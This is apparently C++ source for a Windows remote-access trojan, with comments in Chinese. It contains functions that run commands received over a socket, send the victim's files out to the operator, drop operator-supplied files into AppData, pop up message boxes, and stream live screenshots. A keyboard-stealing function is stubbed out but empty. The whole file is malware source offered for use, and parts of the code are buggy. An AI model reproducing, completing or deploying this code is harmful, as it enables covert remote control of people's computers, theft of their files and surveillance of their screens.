#include<winsock.h>
#include <iostream>
#include <windows.h>
using namespace std;
char send_msg[1024]="default_msg";
char recv_msg[1024];

/////////////////执行cmd命令/////////////////////////
void extend_cmd(char* recv_msg){
	char cmd_buf[1024]={0};
	for(int i=0; i<sizeof(string(recv_msg));i++)
	{
		cmd_buf[i]=recv_msg[i+1];
	}//处理收到的字符串
	FILE *fp = _popen(cmd_buf, "r");//创建管道
	if ((fp) == NULL) {
		std::cout<<"run cmd pip happen fault"<<std::endl;
		memcpy(send_msg,"run cmd pip happen fault",14);
	}else{
		while (fgets(recv_msg, 1024, fp) != NULL) {
			strcat(send_msg,recv_msg);
		}//拼接管道数据
	}
	_pclose(fp);
}
/////////////////下载文件至我///////////////////////////
void send_file(SOCKET s, char* fileName){
	char file_buf[128]={0};
	for(int i=0;i<sizeof((string)fileName);i++){
		file_buf[i]=fileName[i+1];
	}
	std::cout<<"upload file>>>>>"<<file_buf<<std::endl;
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	FILE* read = fopen(file_buf, "rb");
	fseek(read, 0, SEEK_END);	//将文件位置指针移动到最后
	bufSize = ftell(read);	//ftell(FILE *stream)：返回给定流stream的当前文件位置，获取当前位置相对文件首的位移，位移值等于文件所含字节数
	fseek(read, 0, SEEK_SET);	//将文件位置指针移动到开头
	buffer= new char[bufSize];
	int nCount;
	int ret = 0;
	while ((nCount = fread(buffer, 1, bufSize, read)) > 0)	//循环读取文件进行传送
	{
		ret += send(s, buffer, nCount, 0);
		cout<<"ncount--->"<<nCount<<endl;
	}
	fclose(read);
	std::cout << "send file success!"<<" Byte:"<<ret << std::endl;
}
/////////////////我上传文件////////////////////////////
void recv_file(SOCKET s,char* file_path){
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	if (buffer == NULL)
	{
		buffer = new char[bufSize];
	}
	string ext_name;
	char usr_path[32];
	GetEnvironmentVariable("USERPROFILE", usr_path, 32);
	for(int i=1;i<sizeof(string(file_path));i++){
		if (file_path[i]==*"."){
			ext_name.append(&(file_path[i-1]));
			ext_name=usr_path+(string)"\\AppData\\Local\\"+ext_name;
			break;
		}
	}
	cout<<ext_name<<endl;
	FILE* write = fopen(ext_name.c_str(), "wb");
	int nCount;
	do{
		nCount = recv(s, buffer, bufSize, 0);
		fwrite(buffer,nCount, 1, write);
	}while(nCount>=bufSize);

	fclose(write);
	send(s, "ok", 4, 0);
	std::cout << "save file success! Filename-------->"<<ext_name << std::endl;
}
////////////////////弹窗//////////////////////////////
void box_msg(char* msg){
	wchar_t msg_buf[128]={0};
	for(int i=0;i<sizeof((string)msg);i++){
		msg_buf[i]=msg[i+1];
	}
	MessageBoxW(NULL, msg_buf, L"", MB_SYSTEMMODAL);
}
////////////////////窥屏//////////////////////////////
void see(SOCKET s){

	int ScrWidth,ScrHeight;

	BITMAPINFO bInfo;

	HBITMAP hBitmap;
	BYTE* bBits = NULL;
	//现在开始画画了，你拿起了一只笔。
	//——在Windows环境里，这叫选择了一个画笔对象：使用SelectOBject函数。
	//当然，如果你没带笔也没关系，Windows为你准备了几只画笔，你可以这样申请系统提供的缺省画笔：hPen = GetStockObject(WHITE_PEN);
	//如果你画着画着，觉得手中的笔用着不爽，可以换一只啊，没关系的。——依旧是SelectObject()换笔。

	ScrWidth = GetDeviceCaps(GetDC(NULL), HORZRES);
	ScrHeight = GetDeviceCaps(GetDC(NULL), VERTRES);
	
	int xy[2]={ScrHeight,ScrWidth};
	send(s, (char*)&xy, 10, 0);
	HDC hdc = GetDC(NULL);
	HDC hmdc = CreateCompatibleDC(hdc);
	ZeroMemory(&bInfo, sizeof(BITMAPINFO));
	bInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bInfo.bmiHeader.biBitCount = 24;
	bInfo.bmiHeader.biCompression = BI_RGB;
	bInfo.bmiHeader.biPlanes = 1;
	bInfo.bmiHeader.biWidth = ScrWidth;
	bInfo.bmiHeader.biHeight = ScrHeight;
	hBitmap = CreateDIBSection(hdc, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
	SelectObject(hmdc, hBitmap);
	char send_flag[4];
	int len = ScrWidth * ScrHeight * 3;
	while(recv(s, recv_msg, 10, 0)<9){
		BitBlt(hmdc, 0, 0, ScrWidth, ScrHeight, hdc, 0, 0, SRCCOPY);//把hDC数据传到hMemdc，类似于把hDC的数据转到内存中,即截图函数
		send(s, (char*)bBits, len, 0);
		Sleep(200);  // Adjust the sending rate
	}

	DeleteObject(hBitmap);
	DeleteDC(hmdc);
	ReleaseDC(NULL, hdc);
	
}
////////////////////键盘窃取//////////////////////////////
void hook_key(SOCKET s,char* file_path){
	
}
